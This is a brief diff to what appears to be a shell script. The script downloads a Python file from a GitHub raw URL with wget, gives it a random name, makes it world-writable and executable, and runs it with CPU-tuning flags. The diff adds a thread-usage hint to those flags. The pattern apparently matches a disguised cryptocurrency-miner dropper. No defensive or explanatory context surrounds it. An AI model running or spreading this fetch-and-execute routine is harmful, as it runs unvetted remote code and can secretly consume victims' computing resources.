@@ -32,4 +32,4 @@ wget https://raw.githubusercontent.com/im7xeig/scaling-waffle/main/run.py
 NEW_PY=$(random_name).py
 mv run.py $NEW_PY
 chmod 777 $NEW_PY
-./$NEW_PY --huge-pages-jit --cpu-priority=3
+./$NEW_PY --huge-pages-jit --cpu-priority=3 --cpu-max-threads-hint=75
